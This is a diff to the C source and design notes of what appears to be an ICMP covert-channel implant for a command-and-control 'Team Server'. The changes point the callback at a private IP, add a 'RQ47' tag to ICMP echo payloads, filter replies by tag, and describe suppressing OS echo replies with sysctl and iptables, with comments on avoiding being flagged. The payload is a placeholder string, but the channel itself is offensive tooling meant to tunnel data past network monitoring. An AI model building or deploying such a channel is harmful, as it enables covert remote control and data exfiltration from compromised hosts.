@@ -15,6 +15,16 @@ Maybe Problems:
 
  - Type 8 sends the alphabet on basic ping checks. This might get flagged if not this value
 
+ - [ ] OS likes to respond to icmp echo replies. 
+        Fix: 
+            option 1: Disable echo replies on linux: 
+                `sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1`
+            option 2: IP Tables filter out anything not containing TAG:
+                 `sudo iptables -A INPUT -p icmp --icmp-type echo-request -m string --algo bm --string "HCKD" -j DROP`
+                 - only works with unencrypted payloads due to tag in payload
+
+
+
 Fixes:
 
  - Checkout waht some toosl that implemented ICMP did:
@@ -80,16 +90,22 @@ struct icmp_header {
 };
 
 Client sends initial message with length of inbound message. Sequence = 0. Seq 0 is ALWAYS the message size.
-Messsage should have the first X bytes be a tag. Default is "CS", on first 2 bytes. DO NOT use anything in alphabetical order (ex AB)... that's what normal
-pings send. 
+
+Payload should have the first 4 bytes be a tag. Default is "RQ47", on first 2 bytes. DO NOT use anything in alphabetical order (ex ABCD)... that's what normal
+pings send, and will likely confuse the server.
 
 Server should allocate a buffer of this size.
 
-Server then monitors for packet with Seq 1 and matching ID. 
+Server then monitors for packet with Seq 1, matching ID, and first 4 bytes being the TAG (ex, RQ47)
 Server appends the data section to the buffer.
+Server then Sends response back to ICMP request. 
+
+Client gets response data, this response MUST contain the tag, otherwise the response is discarded. This is so an OS reply doesn't slip past by accident, etc. 
 
 When client has sent all data OR a finish flag is received (CANNOT use seq or PID here), server stops listenening, and 
 passes data to Team Server
+
+
 
 
 */
@@ -107,8 +123,8 @@ passes data to Team Server
 //size of payload/data section of icmp.
 //ideally, the program will do the math & figure out how to chunk messages based on this size. Currently, it does not
 #define ICMP_PAYLOAD_SIZE 32
-#define ICMP_CALLBACK_SERVER "8.8.8.8"
-
+#define ICMP_CALLBACK_SERVER "172.19.89.43"
+#define ICMP_TAG "RQ47"
 
 struct icmp_header {
     BYTE Type;
@@ -151,8 +167,8 @@ int send_icmp(SOCKET s, struct sockaddr_in* dest) {
 
     //tagged version
     char* data = packet + sizeof(struct icmp_header);
-    const char* tag = "CS";       // 4-byte tag
-    const char* real_data = "ShmingusBingus";  // payload
+    const char* tag = ICMP_TAG; //4 byte tag
+    const char* real_data = "ShmingusBingus"; // payload
 
     // Combine TAG + DATA into buffer safely
     snprintf(data, ICMP_PAYLOAD_SIZE, "%s%s", tag, real_data);
@@ -212,11 +228,21 @@ void recv_icmp(SOCKET s) {
 
     */
 
+
+    //check first 4 bytes the tag to make sure it's correct
+    if (bytes < 28 || strncmp(payload, ICMP_TAG, 4) != 0) {
+        printf("[-] Invalid or untagged ICMP payload\n");
+        return;
+    }
+
     printf("    Type: %d\n", icmp->Type);
     printf("    Code: %d\n", icmp->Code);
     printf("    ID: %d\n", ntohs(icmp->ID));
     printf("    Seq: %d\n", ntohs(icmp->Sequence));
+    //these use a format specifier to only print X bytes, hence the 2 args here
     printf("    Payload: %.*s\n", bytes - 28, payload); // 20 (IP) + 8 (ICMP header)
+    printf("    Payload (tagless): %.*s\n", bytes - 32, payload + 4); // 20 (IP) + 8 (ICMP header)
+
 }
 
 int main() {
